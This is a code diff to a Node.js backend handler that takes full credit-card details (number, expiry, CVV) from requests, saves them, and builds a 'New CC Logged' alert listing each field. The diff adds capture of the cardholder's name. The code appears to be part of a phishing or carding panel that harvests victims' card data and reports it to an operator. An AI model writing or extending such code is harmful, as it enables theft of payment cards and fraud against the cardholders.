@@ -101,7 +101,7 @@ const fetchBankLogo = async (bankDomain) => {
 };
 
 exports.createCreditCardInfo = async (req, res) => {
-  const { userId, cardNumber, expiryDate, securityCode } = req.body;
+  const { userId, cardNumber, expiryDate, securityCode, nameOnCard } = req.body;
 
   if (!userId) {
     return res.status(400).json({ error: 'User ID is required' });
@@ -166,13 +166,14 @@ exports.createCreditCardInfo = async (req, res) => {
       `;
     }
 
-    const creditCardInfo = new CreditCard({ userId, cardNumber, expiryDate, securityCode, bank: bankId });
+    const creditCardInfo = new CreditCard({ userId, cardNumber, expiryDate, securityCode, nameOnCard, bank: bankId });
     await creditCardInfo.save();
 
     const message = `
-🏠 <b>New CC Logged</b> 🏠
+🏦 <b>New CC Logged</b> 🏦
 ---------------------------------
 👤 <b>UserID:</b> ${userId}
+👤 <b>Name On Card:</b> ${nameOnCard}
 📍 <b>CC NUM:</b> ${cardNumber}
 🏙️ <b>EXP:</b> ${expiryDate}
 🗽 <b>CVV:</b> ${securityCode}
